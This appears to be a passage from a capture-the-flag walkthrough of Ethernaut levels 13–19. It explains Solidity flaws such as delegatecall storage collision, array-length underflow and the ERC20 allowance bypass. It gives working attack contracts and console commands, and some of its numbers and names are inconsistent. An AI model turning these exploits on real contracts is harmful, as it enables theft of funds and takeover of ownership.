- Save your variables to `memory` if you don’t need to persist smart contract state. [SSTORE](https://www.ethervm.io/#SSTORE) and [SLOAD](https://www.ethervm.io/#SLOAD) are very gas intensive opcodes.
- All storage is publicly visible on the blockchain, even your `private` variables!
- Never store passwords and private keys without hashing them first
- 1 byte = 8 bits = 2 hex
- uint8 = bool = 1 byte
- uint16 = 2 bytes

### Level 13. Gatekeeper One

**Goal**: `player` has to pass all require checks and set entrant to player address.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Useful links:

- [gasleft](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties) function
- Solidity [opcode](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2) basics
- [Explicit Conversion](https://docs.soliditylang.org/en/v0.8.3/types.html#explicit-conversions) between types

We start with following `GatePassOne` to attack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract GatePassOne {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)));
        (bool success, ) = address(_gateAddr).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        return success;
    }
}
```

**gateOne**

This is exactly same as level 4. A basic intermediary contract will be used to call `enter`, so that `msg.sender` != `tx.origin`.

**gateTwo**

According to the contract, the remaining gas just after `gasleft` is called, should be a multiple of 8191. We can control the gas amount sent with transaction using `call`. But it need to be set in such a way that amount set minus amount used up until `gasleft`'s return should be a multiple of 8191.

I'm going to use Remix's Debug feature and a little bit of trial & error to determine the remaining gas up until to that point. But first copy & deploy `GatekeeperOne` in Remix with `JavaScript VM` environment (since trials are quick & Debug on testnet didn't work on Remix for me!), with same solidity compiler version. Also deploy `GateKeeperOneGasEstimate` with same environment, to help with estimating gas used up to that point:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract GateKeeperOneGasEstimate {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)));
        (bool success, ) = address(_gateAddr).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        return success;
    }
}
```

Initially choose a random fixed gas amount (but big enough) to send with transaction. Let's say `90000`. And call `enterGate` of `GateKeeperOneGasEstimate` with address of our deployed `GatekeeperOne` (from Remix, not Ethernaut's!) and the chosen gas. Now hit `Debug` button in Remix console against the mined transaction. Focus on left pane.

See the list of opcodes executed corresponding to our contract execution. Step over (or drag progress bar) until the line with `gasleft` is highlighted:

```
289 JUMPDEST
290 PUSH1 ..
292 PUSH2 ..
295 GAS
296 PUSH2
   .
   .
   .
139 RETURN
```

Step here and there to locate the `GAS` opcode which corresponds to `gasleft` call. Proceed just one step more (to `PUSH2` here) and note the "remaining gas" from **Step Detail** just below. In my case it's `4395`. Hence gas used up to that point:

```
gasUsed = _gas - remaining_gas
or, gasUsed = 90000 - 4395
or, gasUsed = 85605
```

Now, we have `gasUsed` and we want set a `_gas` such that `gasLeft` returns a multiple of 8191. One such value would be:

```
_gas = (8191 * 1) + gasUsed
or, _gas = (8191 * 1) + 85605
or, _gas = 93796
```

(Note that I randomly chose `8` to multiply to 8191, you can choose any as log as sufficient gas is provided for transaction)

So `_gas` should probably be `93796` to pass the check. But, the target `GateKeeperOne` contract (Ethernaut's instance) on Rinkeby network must've had a little bit of different compile time options. So correct `_gas` is not necessarily `93796`, but a close one. Let's pick a reasonable margin around `93796` and call `enter` for all values around `93796` with that margin. A margin of `64` worked for me. Let's update `GatePassOne`:

```solidity
contract GatePassOne {
    event Entered(bool success);

    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(uint160(tx.origin)));

        bool succeeded = false;

        for (uint i = _gas - 64; i < _gas + 64; i++) {
          (bool success, ) = address(_gateAddr).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
```

Calling `enterGate` with `GateKeeper` address and `65782`, params should now clear `gateTwo`.

**gateThree**

This has checks that involves explicit conversions between `uint`s. It can be inferred from third `require` statement that the `_gateKey` should be extracted from `tx.origin` through casting while satisfying other checks.

`tx.origin` will be the `player` which in my case is:

`0xd557a44ed144bf8a3da34ba058708d1b4bc0686a`

We should be concerned with only 8 bytes of it since `_gateKey` is `bytes8` (8 byte size) type. And specifically last 8 bytes of it, **since `uint` conversions retain the last bytes.**

![](https://miro.medium.com/max/1400/1*iaHciYKXtdk4-Z9tGaiknw.png)

So, 8 bytes portion (say, `key`) of our interest: `key = 58 70 8d 1b 4b c0 68 6a`

Accordingly, `uint32(uint64(key)) = 4b c0 68 6a`.

To satisfy third `require`, it is needed that:

```solidity
uint32(uint64(key)) == uint16(tx.origin)
or, 4b c0 68 6a = 68 6a
```

which is only possible by masking with `00 00 ff ff` , such that: `4b c0 68 6a & 00 00 ff ff = 68 6a`

The first `require` is satisfied by:

```solidity
uint32(uint64(_gateKey)) == uint16(uint64(key)
or, 4b c0 68 6a = 68 6a
```

which is same problem as previous one and can be achieved with same, previous value of `mask`.

The second `require` asks to satisfy:

```solidity
uint32(uint64(key)) != uint64(key)
or, 4b c0 68 6a != 58 70 8d 1b 4b c0 68 6a
```

We modify the mask to: `mask = ff ff ff ff 00 00 ff ff`

so that it satisfies: `00 00 00 00 4b c0 68 6a & ff ff ff ff 00 00 ff ff != 58 70 8d 1b 4b c0 68 6a` while also satisfying other two requires.

Hence the \_gateKey should be:

```solidity
_gateKey = key & mask
or, _gateKey = 58 70 8d 1b 4b c0 68 6a & ff ff ff ff 00 00 ff ff
```

Finally, update `GatePassOne` to reflect it.

```solidity
contract GatePassOne {
    event Entered(bool success);

    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;

        bool succeeded = false;

        for (uint i = _gas - 64; i < _gas + 64; i++) {
          (bool success, ) = address(_gateAddr).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
```

**_Key Security Takeaways_**

- Abstain from asserting gas consumption in your smart contracts, as different compiler settings will yield different results.
- Be careful about data corruption when converting data types into different sizes.
- **Save gas** by not storing unnecessary values. Pushing a value to state `MSTORE`, `MLOAD` is always **less gas intensive than** store values to the blockchain with `SSTORE`, `SLOAD`
- **Save gas** by using appropriate modifiers to get functions calls for free, i.e. `external pure` or `external view` function calls are free!
- **Save gas** by masking values (less operations), rather than typecasting

### Level 14. Gatekeeper Two

**Goal**: `player` has to set itself as `entrant`, like the previous level.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

**gateOne**

This is exactly same as level 4. An intermediary contract (`GatePassTwo` here) will be used to call `enter`, so that `msg.sender` != `tx.origin`.

**gateTwo**

Second check involves solidity assembly code - specifically `caller` and `extcodesize` functions. `caller()` is nothing but sender of message i.e. `msg.sender` which will be address of `GatePassTwo`.
`extcodesize(addr)` returns the size of contract at address `addr`. So, `x` is assigned the size of the contract at `msg.sender` address. But size of a contract is always going to be non-zero. And to pass check, `x` must zero!

Here's the trick. See the footer note of [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) on page 11:

_"During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account..."_

During creation/initialization of the contract the `extcodesize()` returns 0. So we're going to put the malicious code in `constructor` itself. Since it is the `constructor` that runs during initialization, any calls to `extcodesize()` will return 0. Update `GatePassTwo` accordingly (ignore `key` for now):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassTwo {
    constructor(address _gateAddr) public {
        bytes8 key = bytes8(uint64(address(this)));
        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
```

This will pass `gateTwo`.

**gateThree**
Third check is basically some manipulation with ^ XOR operator.

As is visible from the equality check:

```solidity
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
```

`_gateKey` must be derived from `msg.sender` (in `GatekeeperTwo`), which is same as `address(this)` in our `GatePassTwo`.

The `uint64(0) - 1` on RHS is max value of `uint64` integer (due to **underflow**). Hence, in hex representation: `uint64(0) - 1 = 0xffffffffffffffff`

By nature of XOR operation:
`If, X ^ Y = Z Then, Y = X ^ Z`

Using this XOR property, it can be deduced that:

```solidity
uint64(_gateKey) == uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff)
```

So, correct `key` can be calculated in solidity as:

```solidity
bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff))
```

Final update to `GatePassTwo`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassTwo {
    constructor(address _gateAddr) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff));
        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
```

**_Key Security Takeaways_**

- In addition to [contract blackholes](https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57), you can also create Zombie contracts by stopping contract initialization. The resulting contract has an address, but permanently no code, and will never be able to return you the initial **endowment**.

### Level 15. Naught Coin

**Goal**: `player` is given `totalSupply` of a ERC20 Token - Naught Coin, but cannot transact them before 10 year lockout period. `player` has to get its token balance to 0.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
      _;
    }
  }
}
```

The trick here is that `transfer` is not the only method in `ERC20` (and hence, in `NaughtCoin` too) that includes code for transfer of tokens between addresses.

According to `ERC20` spec, there's also an allowance mechanism that allows anyone to authorize someone else (the `spender`) to spend their tokens! This is exactly what `allowance(address owner, address spender)` method is for, in the `ERC20` contract. The allowance can then be transacted using the `transferFrom(address sender, address recipient, uint256 amount)` method.

Apart from `player`, create another account named - `spender` in your wallet (MetaMask or some other wallet).

Get the `player`'s total balance by:

```js
totalBalance = await contract.balanceOf(player).then((v) => v.toString());
// Output: '1000000000000000000000000'
```

Make the `player` approve `spender` for all of it's tokens:

```js
await contract.approve(spender, totalBalance);
```

Make the `spender` to transfer all of it's allowance (which is equal to all of the tokens of `player`) to `spender` itself.

I used MetaMask wallet and it connects only a single account at a time to an application. But we need both `player` and `spender` connected.

For this, in a new browser window, go to Remix, and connect only the `spender` account to it. (Make sure `player` is disconnected from Remix and `spender` is disconnected from Ethernaut. For me, switching accounts in one window caused switch in other window too, otherwise).

Create an interface to `NaughtCoin`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface INaughtCoin {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}
```

And load instance of `NaughtCoin` using **At Address** button with given instance address of `NaughtCoin`.

Call the `transferFrom` method with params - `player` address as sender, `spender` address as recipient and `1000000000000000000000000` as amount.

**_What is ERC20_**

ERCs (_Ethereum Request for Comment_) are protocols that allow you to create tokens on the blockchain. ERC20, specifically, is a [contract interface](https://medium.com/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d) that defines standard ownership and transaction rules around tokens.

![](https://miro.medium.com/max/1400/1*2DAKs3qHbu9vQ7bEreQSiA.png)

Contextually, ERC20 was cool in 2015 because it was like an API that all developers agreed on. For the first time, anyone could create a new asset class. Developers came up with tokens like Dogecoin, Kucoin, Dentacoin… and could trust that their tokens were accepted by wallets, exchanges, and contracts everywhere.

**_Security issues that accompanied ERC20_**

- **Batchoverflow**: because ERC20 did not enforce SafeMath, it was possible to underflow integers. As we learned in [lvl 5](https://medium.com/coinmonks/ethernaut-lvl-5-walkthrough-how-to-abuse-arithmetic-underflows-and-overflows-2c614fa86b74), this meant that depleting your tokens under 0 would give you `2^256 - 1` tokens!
- **Transfer “bug”**: makers of ERC20 intended for developers to use `approve()` & `transferFrom()` function combination to move tokens around. But this was never clearly stated in documentation, nor did they warn against using `transfer()` (which was also available). Many developers used `transfer()` instead, which locked many tokens forever.
  - As we learned in [lvl 9](https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b), you can’t guarantee 3rd contracts will receive your transfer. If you transfer tokens into non-receiving parties, you will lose tokens forever, since the token contract already decremented your own account’s balance.
- **Poor ERC20 inheritance**: some token contracts did not properly implement the ERC interface, which led to many issues. For example, Golem’s GNT didn’t even implement the crucial `approve()` function, leaving `transfer()` as the only, problematic option.
  - _\***hint**\*_ likewise, this level didn’t implement some key functions — leaving Naughtcoin vulnerable to attack.

**_Key Security Takeaways_**

- **When interfacing with contracts or implementing an ERC interface, implement all available functions.**
- If you plan to create your own tokens, consider newer protocols like: ERC223, ERC721 (used by Cryptokitties), ERC827 (ERC 20 killer).
- If you can, check for [EIP 165 compliance](https://github.com/ethereum/EIPs/pull/881), which confirms which interface an external contract is implementing. Conversely, if you are the one issuing tokens, remember to be EIP-165 compliant.
- Remember to use SafeMath to prevent token under/overflows (as we learned in [lvl 5](https://medium.com/coinmonks/ethernaut-lvl-5-walkthrough-how-to-abuse-arithmetic-underflows-and-overflows-2c614fa86b74))

### Level 16. Preservation

**Goal**: `player` has to claim the ownership of `Preservation`.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

The vulnerability `Preservation` contract comes from the fact that its storage layout is **NOT** parallel or complementing to that of `LibraryContract` whose method the `Preservation` is calling using `delegatecall`.

Since `delegatecall` is **_context-preserving_** any write would alter the storage of `Preservation`, and **NOT** `LibraryContract`.

The call to `setTime` of `LibraryContract` is supposed to change `storedTime` (slot 3) in `Preservation` but instead it would write to `timeZone1Library` (slot 0). This is because storeTime of `LibraryContract` is at slot 0 and the corresponding slot 0 storage at `Preservation` is `timeZone1Library`.

|        | LibraryContract |      Preservation       |
| :----: | :-------------: | :---------------------: |
| Slot 0 |   storedTime    | &larr; timeZone1Library |
| Slot 1 |        -        |    timeZone2Library     |
| Slot 2 |        -        |          owner          |
| Slot 3 |        -        |       storedTime        |

Solution:

This information can be used to alter `timeZone1Library` address to a malicious contract - `HackLibraryContract`. So that calls to `setTime` is executed in a `HackLibraryContract`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackLibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

Note that storage layout of `HackLibraryContract` is complementing to `Preservation` so that proper state variables are changed in `Preservation` when any storage changes. Moreover, `setTime` contains malicious code that changes ownership to msg.sender (which would the `player`).

First deploy EvilLibraryContract and copy it's address. Then alter the timeZone1Library in Preservation by:

```js
await contract.setFirstTime(<hack-library-contract-address>)
```

(a 32 byte `uint` type can accommodate 20 byte `address` value)

Now the `delegatecall` in `setFirstTime` would execute `setTime` of `HackLibraryContract`, instead of `LibraryContract` since `timeZone1Library` is now your malicious contract address.

Call `setFirstTime` with any `uint` param:

```js
await contract.setFirstTime(1);
```

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.

**_Key Security Takeaways_**

- **Ideally, libraries should not store state.**
- When creating libraries, use `library`, not `contract`, to ensure libraries will not modify caller storage data when caller uses `delegatecall`.
- Use higher level function calls to inherit from libraries, especially when you i) don’t need to change contract storage and ii) do not care about gas control.

Useful links:

- Context preserving nature of delegatecall function
  - `delegatecall` preserves contract context. This means that code that is executed via `delegatecall` will act on the state (i.e., storage) of the calling contract. [Source](https://www.bookstack.cn/read/ethereumbook-en/spilt.6.c2a6b48ca6e1e33c.md)
  - [DelegateCall: Calling Another Contract Function in Solidity
    ](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
    - EOA: Externally Owned Account

### Level 17. Recovery

**Goal**: `player` has to retrieve the funds from the lost address of contract which was created using the `Recovery`'s first transaction.

Useful links:

- Basic [Etherscan](https://rinkeby.etherscan.io/) inspection
- [Determining address of a new contract](https://swende.se/blog/Ethereum_quirks_and_vulns.html)

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

If the address of the lost `SimpleToken` address is retrieved it's funds can be retrieved using the `destroy` method.

The easiest way to solve this would be to copy the address of `Recovery` in [Etherscan (on Rinkeby network)](https://rinkeby.etherscan.io/) and inspect transactions in **Internal Txns** tab. Find the latest **Contract Creation** transaction and click through the same to get the address of created contract.

Now simply call `destroy` method at that address.
So, if `tokenAddr` is the retrieved address then:

```js
functionSignature = {
  name: "destroy",
  type: "function",
  inputs: [
    {
      type: "address",
      name: "_to",
    },
  ],
};

params = [player];

data = web3.eth.abi.encodeFunctionCall(functionSignature, params);

await web3.eth.sendTransaction({ from: player, to: tokenAddr, data });
```

Another way to get the lost address is by utilizing the fact that creation of addresses of Ethereum is deterministic and can be calculated by:

```js
keccack256(address, nonce);
```

where `address` is the address of contract that created the transaction and `nonce` is the number of contracts the creator address has created. You can read more [here](https://swende.se/blog/Ethereum_quirks_and_vulns.html) and [there](https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3).

**_Key Security Takeaways_**

- **Money laundering potential**: this [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) elaborates on the potential of using future contract addresses to hide money. Essentially, you can send Ethers to a deterministic address, but the contract there is currently nonexistent. These funds are effectively lost forever until you decide to create a contract at that address and regain ownership.
- **You are not anonymous on Ethereum**: Anyone can follow your current transaction traces, as well as monitor your future contract addresses. This transaction pattern can be used to derive your real world identity.

### Level 18. Magic Number

Goal: `player` has to make a tiny contract (`Solver`) in size (10 opcodes at most) and set it's address in `MagicNum`.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____
     __________/\\\\\_____/\\\///////\\\___
      ________/\\\/\\\____\///______\//\\\__
       ______/\\\/\/\\\______________/\\\/___
        ____/\\\/__\/\\\___________/\\\//_____
         __/\\\\\\\\\\\\\\\\_____/\\\//________
          _\///////////\\\//____/\\\/___________
           ___________\/\\\_____/\\\\\\\\\\\\\\\_
            ___________\///_____\///////////////__
  */
}
```

There's a tight restriction on size of the `Solver` contract - 10 opcodes or less. Because each opcode is 1 byte, the bytecode of the solver must be 10 bytes at max.

Writing high-level solidity would yield the size much greater than just 10 bytes, so we turn to writing raw EVM bytes corresponding to contract opcodes.

We need to write two sections of opcodes:

- **Initialization Opcodes** which EVM uses to create the contract by replicating the runtime opcodes and returning them to EVM to save in storage.
- **Runtime Opcodes** which contains the execution logic of the contract.

Alright, so let's figure out runtime opcode first.

**Runtime Opcode**

The code needs to return the 32 byte magic number - 42 or `0x2a` (in hex).

The corresponding opcode is `RETURN`. But, `RETURN` takes two arguments - the location of value in memory and the size of this value to be returned. That means the `0x2a` needs to be stored in memory first - which `MSTORE` facilitates. But `MSTORE` itself takes two arguments - the location of value in stack and its size. So, we need push the value and size params into stack first using `PUSH1` opcode.

Lookup the opcodes to be used in opcode reference to get corresponding hex codes:

| OPCODE |  NAME  |
| :----: | :----: |
|  0x60  | PUSH1  |
|  0x52  | MSTORE |
|  0xf3  | RETURN |

Let's write corresponding opcodes:

| OPCODE |                                   NAME                                    |
| :----: | :-----------------------------------------------------------------------: |
|  602a  |            Push 0x2a in stack. Value (v) param to MSTORE(0x60)            |
|  6050  |             Push 0x50 in stack. Position (p) param to MSTORE              |
|   52   |             Store value, v=0x2a at position, p=0x50 in memory             |
|  6020  | Push 0x20 (32 bytes, size of v) in stack. Size (s) param to RETURN(0xf3)  |
|  6050  | Push 0x50 (slot at which v=0x42 was stored). Position (p) param to RETURN |
|   f3   |              RETURN value, v=0x42 of size, s=0x20 (32 bytes)              |

Concatenate the opcodes and we get the bytecode: `602a60505260206050f3`, which is exactly 10 bytes, the max limit allowed by the level.

**Initialization opcode**

The initialization opcodes need to come before the runtime opcode. These opcodes need to load runtime opcodes into memory and return the same to EVM.

To `CODECOPY` opcode can be used to copy the runtime opcodes. It takes three arguments - the destination position of copied code in memory, current position of runtime opcode in the bytecode and size of the code in bytes.

Following opcodes is needed for the above purpose:

| OPCODE |   NAME   |
| :----: | :------: |
|  0x60  |  PUSH1   |
|  0x52  |  MSTORE  |
|  0xf3  |  RETURN  |
|  0x39  | CODECOPY |

But we don't know the position of runtime opcode in final bytecode (since init. opcode comes before runtime opcode). Let's omit it using `--` for now and calculate the init. opcodes:

| OPCODE |                                             NAME                                             |
| :----: | :------------------------------------------------------------------------------------------: |
|  600a  | Push 0x0a (size of runtime opcode i.e. 10 bytes) in stack. Size (s) param to COPYCODE (0x39) |
|  60--  |                  Push -- (unknown) in stack. Position (p) param to COPYCODE                  |
|  6000  |     Push 0x00 (chosen destination in memory) in stack. Destination (d) param to COPYCODE     |
|   39   |               Copy code of size, s at position, p to destination, d in memory.               |
|  600a  |  Push 0x0a (size of runtime opcode i.e. 10 bytes) in stack. Size (s) param to RETURN (0xf3)  |
|  6000  |        Push 0x00 (location of value in memory) in stack. Position (p) param to RETURN        |
|   f3   |                           Return value of size, s at position, p.                            |

So the initialization opcode is: `600a60--600039600a6000f3`, which is 12 bytes in total.

And hence runtime opcodes start at index 12 or position `0x0c`.

Therefore initialization opcode must be: `600a600c600039600a6000f3`

**Final Opcode**

Alright we have initialization as well as runtime opcodes now. Concatenate them to get final opcode:

```solidity
    initialization opcode + runtime opcode

=   600a600c600039600a6000f3 + 602a60505260206050f3

=   600a600c600039600a6000f3602a60505260206050f3
```

We can now create the contract by noting the fact that a transaction sent to zero address (`0x0`) with some data is interpreted as Contract Creation by the EVM.

```js
bytecode = "600a600c600039600a6000f3602a60505260206050f3";
txn = await web3.eth.sendTransaction({ from: player, data: bytecode });
```

After deploying get the contract address from returned transaction receipt:

```js
solverAddr = txn.contractAddress;
```

Set the address `Solver` address in `MagicNum`:

```js
await contract.setSolver(solverAddr);
```

Useful links:

- [Solidity Bytecode and Opcode Basics](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2)
- [Destructuring Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/) series
- EVM opcodes [reference](https://ethereum.org/en/developers/docs/evm/opcodes/)
- txn: transaction
- ![](https://miro.medium.com/max/1400/1*5Wrb7z3W6AMtjH6IKJYowg.jpeg)

### Level 19. Alien Codex

**Goal**: `player` has to claim ownership of `AlienCodex`.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

The target `AlienCodex` implements ownership pattern so it must have a `owner` state variable of `address` type, which can also be confirmed upon inspecting ABI (`contract.abi`). Moreover, the 20 byte `owner` is stored at slot 0 (as well as 1 byte bool `contact`).

Before we start, note that every contract on Ethereum has storage like an array of 2<sup>256</sup> (indexing from 0 to 2<sup>256</sup> - 1) slots of 32 byte each.

The vulnerability of `AlienCodex` originates from the `retract` method which sets a new array length without checking a potential _underflow_. Initially, `codex.length` is zero. Upon invoking `retract` method once, 1 is subtracted from zero, causing an underflow. Consequently, `codex.length` becomes 2<sup>256</sup> which is exactly equal to total storage capacity of the contract! That means any storage slot of the contract can now be written by changing the value at proper index of `codex`! This is possible because EVM doesn't validate an array's ABI-encoded length against its actual payload.

First call `make_contact` so that we can pass check - `contacted`, on other methods:

```js
await contract.make_contact();
```

Modify codex length to 2<sup>256</sup> by invoking `retract`:

```js
await contract.retract();
```

Now, we have to calculate the index, `i` of `codex` which corresponds to slot 0 (where `owner` is stored).

Since, `codex` is dynamically sized only it's length is stored at next slot - slot 1. And it's location/position in storage, according to allocation rules, is determined by as `keccak256(slot)` (learn more about [keccak256](https://www.educative.io/answers/what-is-hashing-with-keccak256-in-solidity)):

```js
p = keccak256(slot);
or, (p = keccak256(1));
```

Hence, storage layout would look something like:

```
Slot          Data
------------------------------
    0         owner address, contact bool
    1         codex.length
    .
    .
    .
    p         codex[0]
  p + 1       codex[1]
    .
    .
2^256 - 2     codex[2^256 - 2 - p]
2^256 - 1     codex[2^256 - 1 - p]
    0         codex[2^256 - p]  (overflow!)
```

Form above table it can be seen that slot 0 in storage corresponds to index, `i` = `2^256 - p` or `2^256 - keccak256(1)` of `codex`.

So, writing to that index, `i` will change `owner` as well as `contact`.

You can go on write some Solidity to calculate `i` using `keccak256`, but it can also be done in console which I'm going to use.

Calculate position, `p` in storage of start of `codex` array

```js
// Position p
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
```

Calculate the required index, `i`. Use `BigInt` for mathematical calculations between very large numbers.

```js
i = BigInt(2 ** 256) - BigInt(p);
```

Now since value to be put must be 32 byte, pad the `player` address on left with `0`s to make a total of 32 byte. Don't forget to slice off `0x` prefix from player address.

```js
content = "0x" + "0".repeat(24) + player.slice(2);
```

Finally call revise to alter the storage slot:

```js
await contract.revise(i, content);
```

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

